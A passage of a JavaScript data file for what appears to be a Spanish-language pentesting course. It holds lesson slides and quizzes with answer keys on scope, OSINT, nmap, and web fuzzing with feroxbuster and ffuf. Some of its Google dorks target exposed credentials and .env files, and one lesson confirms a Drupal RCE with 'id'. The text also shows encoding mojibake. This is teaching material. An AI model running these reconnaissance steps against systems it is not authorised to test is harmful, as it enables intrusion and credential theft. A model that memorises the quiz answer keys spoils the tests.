// src/data/redteam.js
// HACKFORGE â€” Red Team
// Basado en contenido propio de HACKFORGE con enfoque prÃ¡ctico

export const REDTEAM_MODULOS = [
  {
    id: "rt-1",
    nombre: "Tu Primer DÃ­a como Pentester",
    icon: "ðŸŽ¯",
    color: "#ff6b35",
    tag: "FREE",
    descripcion: "Antes de tocar una herramienta, entiende cÃ³mo funciona el trabajo real. Alcance, reglas, clientes y metodologÃ­a.",
    lecciones: [
      {
        id: "rt-1-1",
        titulo: "El trabajo real de un pentester",
        slides: [
          {
            tag: "CONTEXTO PROFESIONAL",
            titulo: "No hackeas por hackear",
            contenido: `Una empresa de ciberseguridad vende un servicio a otras empresas: revisar quÃ© tan segura es su tecnologÃ­a antes de que un atacante real lo descubra.

Como pentester junior, vas a trabajar por proyectos, para clientes que pagan, con reglas escritas y fechas de entrega.

La empresa donde trabajas se divide en equipos especializados:

Red Team â€” simula ser un atacante real para ver hasta dÃ³nde podrÃ­a llegar alguien malicioso. Trabajan con redes internas, Windows corporativo y Active Directory.

Seguridad de Aplicaciones â€” revisa apps web, mÃ³viles y APIs. Buscan vulnerabilidades en el cÃ³digo y en cÃ³mo la aplicaciÃ³n maneja datos.

Respuesta a Incidentes â€” cuando algo ya fue comprometido, investigan quÃ© pasÃ³ y cÃ³mo contenerlo.

No te aprendas listas. El trabajo estÃ¡ repartido y tÃº vas a entrar a un equipo para contribuir en proyectos concretos.

Lo mÃ¡s importante que vas a aprender hoy: el alcance lo es todo.`
          },
          {
            tag: "EL PROYECTO",
            titulo: "Cliente, alcance y reglas",
            contenido: `Tu empresa fue contratada por Lumina Athletics, una tienda de ropa deportiva online. Su negocio depende completamente de su sitio web y de los datos de sus clientes.

El lÃ­der de proyecto te entrega un archivo con el scope:

example.com
www.example.com
drupal.example.com
dev.example.com
grafana.example.com
cdn.example.com

Ese archivo es tu biblia durante el proyecto. Cada lÃ­nea es un objetivo. Nada mÃ¡s.

Las reglas del proyecto:
â€” Pruebas solo de lunes a viernes, 09:00 a 18:00
â€” No se permiten pruebas invasivas ni destructivas
â€” pay.example.com estÃ¡ FUERA de alcance (pagos reales)
â€” Si encuentras algo crÃ­tico, avisas de inmediato antes de continuar

Salirte del alcance no es "ser mÃ¡s hacker". Es un problema legal y profesional grave que puede costarte el trabajo y generarle problemas legales a tu empresa.`
          },
          {
            tag: "LAS NOTAS",
            titulo: "Documentar todo â€” sin excepciÃ³n",
            contenido: `Desde el primer minuto del proyecto hasta el Ãºltimo, tomas notas de cada acciÃ³n con fecha y hora exacta.

Â¿Por quÃ© tanta insistencia?

El cliente tiene logs de todo el trÃ¡fico hacia sus servidores. Si algo raro ocurre a las 11:06, debes poder demostrar con certeza quÃ© hiciste en ese momento. Si un servidor se cae a las 14:30 y tÃº no estabas probando nada entonces, tus notas te respaldan.

Sin notas, tu palabra contra los logs del cliente no vale nada.

Un ejemplo de cÃ³mo deben verse:

Martes 31 marzo 2026 (Inicio 09:00)
drupal.example.com
Probe credenciales comunes en el login. Sin resultado.
11:06 â€” Probe inyecciÃ³n bÃ¡sica en bÃºsqueda. Sin resultado.
Captura: drupal_login.png

Anota herramientas usadas, comandos exactos, resultados y horas. Las notas son tambiÃ©n la materia prima del informe final.`
          },
          {
            tag: "LAS FASES",
            titulo: "El flujo de un pentest",
            contenido: `Un pentest se divide en fases. No saltas pasos.

RECONOCIMIENTO
Antes de tocar nada, conoces al cliente. QuÃ© hace la empresa, quÃ© tecnologÃ­a usa, quÃ© informaciÃ³n pÃºblica existe sobre ella. OSINT: recolectar datos disponibles abiertamente sin atacar nada. TambiÃ©n buscas filtraciones de datos (leaks) del cliente.

ESCANEO
Descubres quÃ© servicios expone cada objetivo del scope. Puerto abierto = puerta potencial. Herramienta principal: nmap.

ENUMERACIÃ“N
Entiendes a fondo cada servicio encontrado. Una web: quÃ© rutas tiene, quÃ© tecnologÃ­a usa, quÃ© formularios. Un SSH: quÃ© versiÃ³n, si acepta contraseÃ±as.

EXPLOTACIÃ“N
Confirmas que una posible vulnerabilidad es real, con una prueba mÃ­nima y reproducible. Si el hallazgo es crÃ­tico, avisas antes de profundizar.

POST-EXPLOTACIÃ“N
Dentro del sistema comprometido, mides hasta dÃ³nde llega el riesgo real. Siempre dentro del alcance.

INFORME
El documento donde le entregas todo al cliente: hallazgos, impacto real y recomendaciones para arreglarlos. El informe es lo que el cliente realmente paga.`
          },
        ],
        quiz: [
          {
            q: "Mientras revisas drupal.example.com encuentras otro dominio del mismo cliente que no estÃ¡ en el scope. Â¿QuÃ© haces?",
            opts: ["Lo reviso igual, es del mismo cliente", "Lo anoto e informo al lÃ­der o cliente antes de tocar cualquier cosa", "Lo reviso solo superficialmente sin herramientas agresivas", "Lo ignoro completamente sin documentarlo"],
            c: 1,
            e: "Salirte del alcance sin autorizaciÃ³n es ilegal, incluso si el dominio pertenece al mismo cliente. Se anota, se informa y se espera autorizaciÃ³n escrita antes de proceder."
          },
          {
            q: "Son las 21:30 de un jueves y estÃ¡s cerca de confirmar un hallazgo importante. El proyecto permite pruebas solo de 09:00 a 18:00. Â¿QuÃ© haces?",
            opts: ["ContinÃºo un par de horas mÃ¡s, el cliente no se va a dar cuenta", "Paro ahora, anoto exactamente dÃ³nde quedÃ© y retomo maÃ±ana dentro del horario", "Le escribo al cliente para pedir permiso de continuar ahora mismo", "ContinÃºo porque es un hallazgo importante que justifica la excepciÃ³n"],
            c: 1,
            e: "Las reglas del proyecto son absolutas. Trabajar fuera del horario sin autorizaciÃ³n es una violaciÃ³n del contrato. Anotas el punto exacto donde quedaste y continÃºas maÃ±ana dentro del horario."
          },
          {
            q: "Encuentras una vulnerabilidad crÃ­tica que podrÃ­a exponer datos de miles de clientes. Â¿CuÃ¡l es el paso correcto?",
            opts: ["La exploto a fondo para tener evidencia mÃ¡s contundente antes de reportar", "La guardo para el informe final para no alarmar al cliente antes de tiempo", "Aviso de inmediato al cliente antes de continuar, como establecen las reglas del proyecto", "La omito si el esfuerzo de explotarla completamente es muy alto"],
            c: 2,
            e: "Las reglas del proyecto establecen aviso inmediato para hallazgos crÃ­ticos. Un RCE o exposiciÃ³n de datos masivos no espera al informe final: cada hora de retraso es riesgo real para el negocio del cliente."
          },
          {
            q: "Â¿Por quÃ© se insiste tanto en anotar la hora exacta de cada prueba?",
            opts: ["Para que el informe final quede mÃ¡s ordenado visualmente", "Para poder demostrar exactamente quÃ© hiciste en cada momento usando los logs del cliente como referencia", "Porque las herramientas de pentesting requieren timestamps para funcionar", "Para cumplir requisitos legales internacionales de auditorÃ­a"],
            c: 1,
            e: "El cliente tiene logs de todo el trÃ¡fico. Si algo inusual ocurre en sus servidores, tus notas con timestamps exactos determinan si fuiste tÃº o fue otro evento. Sin notas, no puedes defenderte ante acusaciones."
          },
          {
            q: "Â¿QuÃ© es el 'scope' de un proyecto de pentesting?",
            opts: ["El presupuesto total del proyecto de seguridad", "La lista exacta de sistemas y condiciones que tienes autorizaciÃ³n de probar", "Las herramientas que tienes permitido usar durante el proyecto", "El tiempo total disponible para completar el proyecto"],
            c: 1,
            e: "El scope define exactamente quÃ© estÃ¡ autorizado: dominios, IPs, rangos de red, condiciones de prueba y restricciones. Cualquier sistema fuera del scope estÃ¡ prohibido, sin importar si parece relacionado con el cliente."
          },
        ]
      },

      {
        id: "rt-1-2",
        titulo: "Reconocimiento â€” OSINT y Leaks",
        slides: [
          {
            tag: "FASE 1",
            titulo: "Conocer antes de atacar",
            contenido: `El reconocimiento no es opcional. Antes de escanear un solo puerto, entiendes a quiÃ©n te enfrentas.

Para Lumina Athletics:
â€” Â¿QuÃ© vende exactamente? Â¿CÃ³mo gana dinero?
â€” Â¿QuÃ© tecnologÃ­a parece usar?
â€” Â¿QuÃ© subdominios aparecen mencionados pÃºblicamente?
â€” Â¿Sus ofertas de trabajo revelan quÃ© software usan internamente?
â€” Â¿Hay filtraciones de datos del cliente dando vueltas?

A esto se le llama OSINT: Open Source Intelligence. Recolectar informaciÃ³n disponible abiertamente sin tocar directamente los sistemas del objetivo.

Es reconnaissance pasivo: no generas trÃ¡fico hacia el cliente, no activas logs, no dejas huella.

Una filtraciÃ³n de credenciales de un empleado de Lumina Athletics puede ser mÃ¡s valiosa que cualquier vulnerabilidad tÃ©cnica. Si alguien usÃ³ su email corporativo en una brecha anterior, esas credenciales pueden funcionar hoy.`
          },
          {
            tag: "HERRAMIENTAS",
            titulo: "OSINT en la prÃ¡ctica",
            contenido: `Herramientas y fuentes de reconocimiento pasivo:

WHOIS â€” informaciÃ³n de registro del dominio:
whois example.com
Revela: registrante, email, fecha de creaciÃ³n, servidores DNS.

Certificate Transparency â€” subdominios en certificados SSL:
curl "https://crt.sh/?q=%.example.com&output=json"
EncontrarÃ¡s subdominios que nunca aparecen en el sitio pÃºblico.

Subfinder / Amass â€” enumeraciÃ³n de subdominios:
subfinder -d example.com
amass enum -d example.com

Shodan â€” dispositivos expuestos a internet:
shodan search "Lumina Athletics"
Â¿Tienen dispositivos IoT sin autenticaciÃ³n? Â¿Paneles admin expuestos?

Have I Been Pwned / Dehashed â€” credenciales filtradas:
Buscar el dominio del cliente (@lumina.com) en bases de datos de brechas.

LinkedIn + Google Dorks:
site:example.com filetype:pdf
"lumina athletics" filetype:xlsx
Los documentos pÃºblicos revelan estructura interna, nombres de empleados y a veces datos sensibles.`
          },
          {
            tag: "GOOGLE DORKS",
            titulo: "Google como herramienta de reconocimiento",
            contenido: `Google indexa mucho mÃ¡s de lo que las empresas quieren. Los Google Dorks son bÃºsquedas avanzadas que revelan informaciÃ³n expuesta accidentalmente.

Operadores principales:

site: â€” buscar solo dentro de un dominio:
site:example.com admin
site:example.com login

filetype: â€” buscar tipos de archivo especÃ­ficos:
site:example.com filetype:pdf
site:example.com filetype:sql
site:example.com filetype:env (archivos de configuraciÃ³n)

intitle: / inurl: â€” buscar en tÃ­tulos o URLs:
intitle:"index of" site:example.com (directorios listados)
inurl:/admin site:example.com

Combinaciones Ãºtiles:
site:example.com "contraseÃ±a" OR "password"
site:example.com "DB_PASSWORD" OR "API_KEY"

Herramienta: dorkdork.io, Google Hacking Database (exploit-db.com/google-hacking-database) tiene miles de dorks categorizados.

IMPORTANTE: Google Dorks es pasivo â€” solo consultas a Google, sin tocar el objetivo directamente.`
          },
          {
            tag: "LEAKS",
            titulo: "Filtraciones de credenciales",
            contenido: `Las filtraciones de datos son uno de los hallazgos mÃ¡s valiosos en reconnaissance.

Â¿QuÃ© es un leak? InformaciÃ³n del cliente (emails, contraseÃ±as, documentos) que fue publicada o vendida sin permiso como consecuencia de una brecha anterior.

Por quÃ© importa:
La reutilizaciÃ³n de contraseÃ±as es extremadamente comÃºn. Si un empleado usÃ³ su email corporativo en un servicio que fue comprometido, esa misma contraseÃ±a podrÃ­a funcionar en el VPN, el correo corporativo o el panel de administraciÃ³n.

Fuentes para buscar:
â€” Have I Been Pwned (haveibeenpwned.com): busca si un email o dominio aparece en brechas conocidas
â€” DeHashed: motor de bÃºsqueda de credenciales filtradas
â€” IntelligenceX: buscador de datos de brechas e informaciÃ³n OSINT
â€” Pastebin y foros de hacking: monitoreados por herramientas como Pulsedive

Si encuentras credenciales filtradas del cliente:
1. Las anotas como hallazgo inmediato
2. Las reportas al cliente (sin usarlas sin autorizaciÃ³n)
3. Preguntas si estÃ¡n dentro del scope las pruebas de credential stuffing

Una credencial filtrada ya es un hallazgo crÃ­tico aunque no la uses.`
          },
        ],
        quiz: [
          {
            q: "Â¿QuÃ© es OSINT y por quÃ© es legal en un pentest?",
            opts: ["Una tÃ©cnica de explotaciÃ³n avanzada que requiere autorizaciÃ³n especial", "RecolecciÃ³n de informaciÃ³n disponible pÃºblicamente â€” no tocas los sistemas del objetivo, solo consultas fuentes abiertas", "Un tipo de escaneo de red sigiloso", "Una tÃ©cnica de ingenierÃ­a social dirigida a empleados"],
            c: 1,
            e: "OSINT usa solo informaciÃ³n pÃºblicamente disponible: WHOIS, certificados SSL, LinkedIn, Google. No genera trÃ¡fico hacia el objetivo ni deja logs. Es el primer paso de cualquier reconocimiento y completamente legal por sÃ­ mismo."
          },
          {
            q: "Ejecutas crt.sh para el dominio del cliente y encuentras dev.example.com y staging.example.com que no estaban en el scope original. Â¿QuÃ© haces?",
            opts: ["Los escaneo de inmediato porque son parte del mismo cliente", "Los anoto como informaciÃ³n de reconocimiento y lo informo al cliente para verificar si deben agregarse al scope", "Los ignoro porque no estaban en el scope original", "Los reporto como vulnerabilidad en el informe final"],
            c: 1,
            e: "Los subdominios descubiertos en reconnaissance son informaciÃ³n valiosa. Se documentan y se reportan al cliente para que confirmen si deben ser incluidos en el scope. No se prueban sin autorizaciÃ³n explÃ­cita."
          },
          {
            q: "Encuentras en Have I Been Pwned que 3 emails de empleados de Lumina Athletics aparecen en brechas con contraseÃ±as en texto plano. Â¿CuÃ¡l es el valor de este hallazgo?",
            opts: ["Es irrelevante porque las contraseÃ±as son de otros servicios, no del cliente", "Es un hallazgo crÃ­tico â€” las credenciales filtradas pueden reutilizarse en sistemas del cliente y deben reportarse inmediatamente", "Solo es Ãºtil si las contraseÃ±as siguen siendo vÃ¡lidas en el cliente", "Es informaciÃ³n pÃºblica sin valor de seguridad"],
            c: 1,
            e: "La reutilizaciÃ³n de contraseÃ±as es un problema masivo. Credenciales filtradas de otros servicios frecuentemente funcionan en sistemas corporativos. El hallazgo debe reportarse antes de cualquier prueba de validaciÃ³n, que requerirÃ­a autorizaciÃ³n explÃ­cita."
          },
          {
            q: "Â¿QuÃ© podrÃ­a revelar la bÃºsqueda Google: site:example.com filetype:env?",
            opts: ["El trÃ¡fico de red del servidor del cliente", "Archivos .env accidentalmente indexados por Google que pueden contener claves API, contraseÃ±as de base de datos y otros secretos", "La estructura de la base de datos del cliente", "Los logs de acceso del servidor web"],
            c: 1,
            e: "Los archivos .env contienen configuraciÃ³n de la aplicaciÃ³n incluyendo credenciales: DB_PASSWORD, API_KEY, SECRET_KEY. Si Google los indexÃ³, son pÃºblicamente accesibles. Es uno de los errores de configuraciÃ³n mÃ¡s comunes y graves."
          },
          {
            q: "Â¿CuÃ¡l es la diferencia entre reconocimiento activo y pasivo?",
            opts: ["El pasivo usa herramientas; el activo es manual", "El pasivo no genera trÃ¡fico hacia el objetivo (OSINT, Google, crt.sh); el activo interactÃºa directamente con los sistemas del cliente (escaneos, peticiones)", "El activo es mÃ¡s preciso; el pasivo es mÃ¡s rÃ¡pido", "No hay diferencia prÃ¡ctica entre los dos"],
            c: 1,
            e: "Reconocimiento pasivo: sin tocar el objetivo (WHOIS, Google, LinkedIn, crt.sh). No deja logs en el cliente. Reconocimiento activo: interacciÃ³n directa (nmap, peticiones HTTP, fuzzing). Genera logs en el cliente y requiere estar dentro del horario y scope autorizados."
          },
        ]
      },
    ]
  },

  {
    id: "rt-2",
    nombre: "Escaneo con Nmap",
    icon: "ðŸ”",
    color: "#00d4ff",
    tag: "FREE",
    descripcion: "Aprende a mapear la superficie de ataque de un objetivo real usando el escÃ¡ner mÃ¡s importante del pentesting.",
    lecciones: [
      {
        id: "rt-2-1",
        titulo: "CÃ³mo funciona Nmap",
        slides: [
          {
            tag: "ESCANEO",
            titulo: "Â¿QuÃ© significa escanear?",
            contenido: `Escanear es descubrir quÃ© servicios expone cada objetivo.

Un servidor puede tener docenas de programas corriendo simultÃ¡neamente. Cada uno espera conexiones en un puerto distinto. Cuando escaneas, preguntas: Â¿quÃ© puertas estÃ¡n abiertas en este servidor?

Nmap no sabe de antemano quÃ© puertos estÃ¡n abiertos. Hace exactamente lo que harÃ­as a mano: intenta conectarse a cada puerto y mira quÃ© responde.

Si la conexiÃ³n se establece y el otro lado responde â†’ puerto ABIERTO.
Si la conexiÃ³n es rechazada activamente â†’ puerto CERRADO.
Si no llega ninguna respuesta â†’ puerto FILTRADO (probablemente un firewall en medio).

Nmap tiene una base de datos con cÃ³mo responden los servicios conocidos. Si el puerto 443 responde como un servidor web â†’ lo marca como HTTPS. No es adivinanza: envÃ­a datos y compara la respuesta con patrones conocidos.

Recuerda: nmap sin autorizaciÃ³n contra sistemas ajenos es ilegal. Siempre dentro del scope autorizado.`
          },
          {
            tag: "COMANDOS",
            titulo: "Nmap en el proyecto real",
            contenido: `El scope de Lumina Athletics estÃ¡ en scope.txt. AsÃ­ escaneas todo de una vez:

nmap -iL scope.txt

-iL lee la lista de objetivos desde el archivo. Escaneas exactamente el alcance sin escribir cada objetivo a mano y sin riesgo de equivocarte.

Resultado tÃ­pico para este proyecto:

drupal.example.com â†’ 22 (ssh), 80 (http), 443 (https)
dev.example.com â†’ 80 (http), 8080 (http-proxy)
grafana.example.com â†’ 3000 (ppp)
cdn.example.com â†’ 443 (https)

Anota estos resultados completos en tus notas con fecha y hora. Son el mapa de puertas del proyecto.

El escaneo por defecto solo revisa los puertos mÃ¡s comunes (~1000). Para ser exhaustivo en objetivos importantes:

nmap -p- drupal.example.com

-p- escanea todos los puertos del 1 al 65535. MÃ¡s lento, pero no pierde servicios escondidos en puertos no estÃ¡ndar.`
          },
          {
            tag: "DETECCIÃ“N",
            titulo: "Identificar servicios y versiones",
            contenido: `Saber que el puerto 22 estÃ¡ abierto no dice mucho. Lo que necesitas es saber QUÃ‰ corre ahÃ­ y en QUÃ‰ VERSIÃ“N.

La versiÃ³n es el puente entre "encontrÃ© una puerta" y "esta puerta tiene un problema documentado".

nmap -sV -p 22,80,443 drupal.example.com

-sV activa la detecciÃ³n de versiones. En lugar de decirte "puerto 22 abierto", te dice:
22/tcp open  ssh  OpenSSH 8.9p1 Ubuntu 3ubuntu0.6

Combinar con -sC agrega scripts bÃ¡sicos de reconocimiento automÃ¡tico:
nmap -sVC -p- drupal.example.com

-sVC es la combinaciÃ³n de -sV y -sC. VersiÃ³n + scripts por defecto.

Los scripts detectan cosas Ãºtiles automÃ¡ticamente:
â€” TÃ­tulo de la pÃ¡gina web
â€” VersiÃ³n del certificado SSL y fecha de expiraciÃ³n
â€” Si SSH acepta autenticaciÃ³n por contraseÃ±a o solo por clave
â€” Si el servidor SMB tiene archivos compartidos accesibles

Con la versiÃ³n exacta de cada servicio puedes buscar CVEs en nvd.nist.gov o searchsploit.`
          },
        ],
        quiz: [
          {
            q: "Un puerto aparece como 'filtered' en el escaneo de Nmap. Â¿QuÃ© significa mÃ¡s probablemente?",
            opts: ["El puerto estÃ¡ abierto pero con autenticaciÃ³n requerida", "Algo en el camino (firewall) estÃ¡ descartando los paquetes sin responder â€” Nmap no puede determinar el estado", "El servicio estÃ¡ caÃ­do temporalmente", "El puerto no existe en ese sistema"],
            c: 1,
            e: "Filtered significa que Nmap no recibiÃ³ ni aceptaciÃ³n ni rechazo â€” los paquetes desaparecen. Esto sugiere un firewall o filtro de red descartando el trÃ¡fico silenciosamente. El servicio puede estar ahÃ­, solo bloqueado."
          },
          {
            q: "Â¿Por quÃ© es importante usar -iL scope.txt en lugar de escribir los objetivos manualmente?",
            opts: ["Porque es mÃ¡s rÃ¡pido escribir -iL que los dominios", "Porque garantiza escanear exactamente lo que estÃ¡ en el scope, sin errores tipogrÃ¡ficos ni riesgo de incluir sistemas fuera de alcance", "Porque nmap no puede procesar mÃ¡s de un objetivo sin el flag -iL", "Para guardar los resultados automÃ¡ticamente en el archivo"],
            c: 1,
            e: "-iL scope.txt asegura que escaneas exactamente lo que estÃ¡ autorizado. Un error tipogrÃ¡fico al escribir manualmente podrÃ­a escanear sistemas fuera del scope â€” una violaciÃ³n del contrato aunque sea accidental."
          },
          {
            q: "Nmap detecta en drupal.example.com: '443/tcp open https nginx 1.18.0'. Â¿Por quÃ© es mÃ¡s Ãºtil que solo saber que el puerto 443 estÃ¡ abierto?",
            opts: ["Solo sirve para documentaciÃ³n estÃ©tica del informe", "La versiÃ³n nginx 1.18.0 permite buscar CVEs especÃ­ficos para esa versiÃ³n y encontrar exploits pÃºblicos disponibles", "Confirma que el sitio usa HTTPS correctamente", "Indica que el servidor es seguro porque nginx es moderno"],
            c: 1,
            e: "La versiÃ³n exacta permite buscar en bases de datos de CVEs (nvd.nist.gov, exploit-db.com) vulnerabilidades especÃ­ficas para nginx 1.18.0. Sin la versiÃ³n, no puedes saber si el servicio tiene problemas conocidos."
          },
          {
            q: "Â¿QuÃ© diferencia hay entre nmap sin flags de puerto y nmap -p- ?",
            opts: ["No hay diferencia prÃ¡ctica", "Sin flags escanea solo los ~1000 puertos mÃ¡s comunes; -p- escanea todos los 65535 puertos posibles, sin perder servicios en puertos no estÃ¡ndar", "-p- es mÃ¡s sigiloso y no genera logs", "Sin flags es mÃ¡s lento pero mÃ¡s preciso"],
            c: 1,
            e: "El escaneo por defecto cubre solo los puertos mÃ¡s usados. Un administrador puede poner un servicio sensible en el puerto 50000 o 31337 para que no aparezca en escaneos bÃ¡sicos. -p- no deja nada sin revisar."
          },
          {
            q: "DespuÃ©s del escaneo inicial guardas los resultados en tus notas. Â¿Por quÃ© es fundamental hacerlo en este momento?",
            opts: ["Para tener backup por si nmap falla en futuros escaneos", "Porque es el mapa de puertas del proyecto â€” la base de todas las fases siguientes â€” y necesitas fecha y hora exacta para el informe y para tu protecciÃ³n legal", "Solo para cumplir el formato del informe final", "Porque el cliente pide los logs de nmap al final del proyecto"],
            c: 1,
            e: "El resultado del escaneo inicial es tu punto de partida para todo lo que sigue. Con fecha y hora exacta, puedes demostrar que tu actividad fue planificada y autorizada. Sin eso, no puedes defender tus acciones si algo ocurre durante el proyecto."
          },
        ]
      },

      {
        id: "rt-2-2",
        titulo: "EnumeraciÃ³n Web y Fuzzing",
        slides: [
          {
            tag: "ENUMERACIÃ“N",
            titulo: "Entender un servicio web a fondo",
            contenido: `El escaneo te dice que hay una web en el puerto 443. La enumeraciÃ³n te dice QUÃ‰ es esa web.

Primer paso: Ã¡brela como un usuario normal. Haz click en todo.

Cuando haces click en "Iniciar sesiÃ³n" y la URL cambia a /user/login, eso es un endpoint. Cuando ves un formulario de bÃºsqueda, hay un parÃ¡metro. Cuando aparece un error, hay tecnologÃ­a y a veces versiones.

Segundo paso: leer el cÃ³digo fuente (Ctrl+U en el navegador).

Busca en el HTML y JavaScript:
â€” Rutas: fetch('/api/v1/users') â†’ endpoint descubierto
â€” Comentarios: <!-- TODO: remove debug endpoint -->
â€” TecnologÃ­as: X-Generator: Drupal 9

Tercer paso: analizar cabeceras HTTP con curl:
curl -I https://drupal.example.com

Cabeceras que revelan tecnologÃ­a:
Server: nginx/1.18.0
X-Powered-By: PHP/7.4.3
X-Generator: Drupal 9 (Â¡bingo!)

Con "Drupal 9" en la cabecera X-Generator ya sabes:
1. Es un CMS conocido con vulnerabilidades documentadas
2. Puedes buscar CVEs especÃ­ficos para Drupal 9
3. Hay un archivo CHANGELOG.txt que puede revelar la versiÃ³n exacta`
          },
          {
            tag: "FUZZING",
            titulo: "Descubrir rutas ocultas",
            contenido: `La web muestra las rutas que el desarrollador quiso mostrar. Pero hay mÃ¡s.

Paneles de administraciÃ³n, entornos de desarrollo, APIs ocultas, archivos de configuraciÃ³n accidentalmente expuestos, versiones antiguas con vulnerabilidades.

Â¿CÃ³mo los encuentras? La Ãºnica forma es preguntar. Fuzzing: enviar miles de peticiones automÃ¡ticas probando nombres de rutas comunes y ver cuÃ¡les existen.

Herramienta principal: feroxbuster

feroxbuster -u https://drupal.example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

-u es la URL objetivo
-w es la wordlist con nombres de rutas a probar
--depth controla la profundidad de recursiÃ³n

Feroxbuster tiene recursiÃ³n: cuando encuentra /admin, automÃ¡ticamente empieza a probar /admin/users, /admin/config, /admin/settings. Ahorra trabajo manual.

El servidor responde con cÃ³digos HTTP:
200 â†’ ruta existe y tiene contenido
403 â†’ ruta existe pero no tienes acceso (Â¡interesante!)
404 â†’ no existe
301/302 â†’ redirecciÃ³n (sigue a dÃ³nde apunta)`
          },
          {
            tag: "FILTRADO",
            titulo: "Leer los resultados con criterio",
            contenido: `El fuzzing genera mucho ruido. Aprende a filtrar.

Problema comÃºn: el servidor responde 200 a todo, incluso a rutas que no existen. Tiene una pÃ¡gina de error genÃ©rica con cÃ³digo 200.

SoluciÃ³n: filtrar por tamaÃ±o de respuesta.

Si las respuestas falsas tienen siempre 1234 bytes:
feroxbuster -u https://drupal.example.com -w lista.txt --filter-size 1234

Con ffuf tambiÃ©n puedes fuzzear partes especÃ­ficas:
ffuf -u https://drupal.example.com/FUZZ -w lista.txt -fs 1234

La palabra FUZZ va donde quieres variar. Puede estar en la ruta, en un parÃ¡metro, en una cabecera.

Durante el fuzzing de Lumina Athletics aparece:
200 â†’ /CHANGELOG.txt

Un CHANGELOG es el historial de versiones del software. En Drupal, revela la versiÃ³n exacta instalada. Con la versiÃ³n exacta puedes buscar CVEs especÃ­ficos que tengan exploit pÃºblico disponible.

Anota en tus notas: hora del descubrimiento, herramienta usada, resultado exacto.`
          },
        ],
        quiz: [
          {
            q: "Analizando el cÃ³digo fuente de una web encuentras: fetch('/api/v1/users?admin=true'). Â¿Por quÃ© es relevante?",
            opts: ["Solo confirma que la web usa JavaScript", "Revela un endpoint de API y un parÃ¡metro (admin=true) que podrÃ­a ser manipulable â€” posible escalada de privilegios", "Es cÃ³digo interno que no afecta la seguridad externa", "Solo sirve si el endpoint devuelve datos sensibles"],
            c: 1,
            e: "Un endpoint con parÃ¡metro admin=true es seÃ±al de posible vulnerabilidad de control de acceso. Â¿QuÃ© pasa si cambias admin=false a admin=true en una peticiÃ³n? Â¿QuÃ© pasa si accedes al endpoint sin autenticaciÃ³n?"
          },
          {
            q: "El fuzzing encuentra /backup.zip con cÃ³digo 200. Â¿Por quÃ© es crÃ­tico?",
            opts: ["Los archivos zip siempre son malware", "Un backup accesible pÃºblicamente puede contener cÃ³digo fuente, bases de datos, credenciales y configuraciÃ³n â€” exposiciÃ³n masiva de informaciÃ³n", "Solo importa si contiene contraseÃ±as en texto plano", "Es normal que los servidores web tengan archivos de backup"],
            c: 1,
            e: "Un backup del sitio expuesto pÃºblicamente puede contener el cÃ³digo fuente completo (con credenciales hardcodeadas), dumps de base de datos, archivos de configuraciÃ³n y todo lo necesario para comprometer la aplicaciÃ³n."
          },
          {
            q: "El servidor responde 403 Forbidden a /admin/panel. Â¿Esto confirma que el recurso no existe?",
            opts: ["SÃ­, 403 y 404 significan lo mismo â€” el recurso no estÃ¡ disponible", "No, 403 confirma que el recurso EXISTE pero no tienes acceso â€” es mÃ¡s interesante que un 404", "SÃ­, 403 significa que el directorio estÃ¡ vacÃ­o", "Depende de la configuraciÃ³n del servidor web"],
            c: 1,
            e: "403 Forbidden confirma existencia del recurso â€” el servidor sabe que estÃ¡ ahÃ­ pero rechaza el acceso. Es el punto de partida para tÃ©cnicas de bypass de 403: cambiar mÃ©todo HTTP, manipular cabeceras X-Original-URL, usar codificaciones alternativas."
          },
          {
            q: "El escaneo con feroxbuster encuentra /CHANGELOG.txt en Drupal. Â¿CuÃ¡l es el valor de este hallazgo?",
            opts: ["Ninguno, los changelogs son pÃºblicos intencionalmente", "Revela la versiÃ³n exacta de Drupal instalada, lo que permite buscar CVEs especÃ­ficos y exploits pÃºblicos para esa versiÃ³n", "Solo sirve para saber cuÃ¡ndo fue actualizado el sitio por Ãºltima vez", "Es Ãºtil solo si el servidor tiene autenticaciÃ³n dÃ©bil"],
            c: 1,
            e: "CHANGELOG.txt en Drupal lista las versiones con sus fechas. Con la versiÃ³n exacta (ej: Drupal 9.5.0), puedes buscar CVE-XXXX-XXXXX especÃ­ficos para esa versiÃ³n en nvd.nist.gov o Exploit-DB, y encontrar cÃ³digo de exploit listo para usar."
          },
          {
            q: "Â¿Por quÃ© usar feroxbuster en lugar de probar rutas manualmente una por una?",
            opts: ["Feroxbuster no requiere conexiÃ³n a internet para funcionar", "Automatiza miles de peticiones por segundo â€” probar una wordlist de 50,000 rutas manualmente tomarÃ­a semanas; feroxbuster lo hace en minutos", "Es mÃ¡s sigiloso que las peticiones manuales", "Porque el cliente exige el uso de herramientas certificadas"],
            c: 1,
            e: "Wordlists como raft-medium-directories.txt tienen 30,000+ entradas. A 10 segundos por prueba manual serÃ­an 3,000+ minutos. Feroxbuster prueba cientos por segundo con recursiÃ³n automÃ¡tica. La automatizaciÃ³n es fundamental en pentesting real."
          },
        ]
      },
    ]
  },

  {
    id: "rt-3",
    nombre: "ExplotaciÃ³n y Acceso Inicial",
    icon: "âš¡",
    color: "#ff3b3b",
    tag: "FREE",
    descripcion: "Confirmar vulnerabilidades de forma controlada, obtener acceso y trabajar con responsabilidad profesional.",
    lecciones: [
      {
        id: "rt-3-1",
        titulo: "Del hallazgo al acceso",
        slides: [
          {
            tag: "EXPLOTACIÃ“N",
            titulo: "Confirmar antes de profundizar",
            contenido: `Llegaste aquÃ­ con informaciÃ³n concreta: drupal.example.com corre Drupal 9.5.0. La enumeraciÃ³n encontrÃ³ una versiÃ³n con CVE pÃºblico que permite RCE.

RCE (Remote Code Execution) significa que puedes hacer que el servidor ejecute comandos que tÃº le mandas desde afuera.

Pero antes de hacer nada, te detienes y piensas:

Â¿El scope autoriza explÃ­citamente pruebas de ejecuciÃ³n de cÃ³digo?
Â¿Hay riesgo de afectar la operaciÃ³n de la tienda en producciÃ³n?
Â¿Es un servidor que maneja pagos reales?

Si algo no estÃ¡ claro â†’ no continÃºas por intuiciÃ³n. Lo documentas y consultas con el lÃ­der o el cliente.

Un RCE en la web principal del cliente es un hallazgo crÃ­tico. Las reglas dicen avisas de inmediato, antes de profundizar.

Cuando tengas luz verde, la prueba mÃ­nima es un comando inofensivo:
id â†’ muestra quÃ© usuario eres en el sistema

Si el servidor responde uid=33(www-data), tienes evidencia sÃ³lida: el servidor ejecutÃ³ tu comando. Para el informe esto puede ser suficiente.`
          },
          {
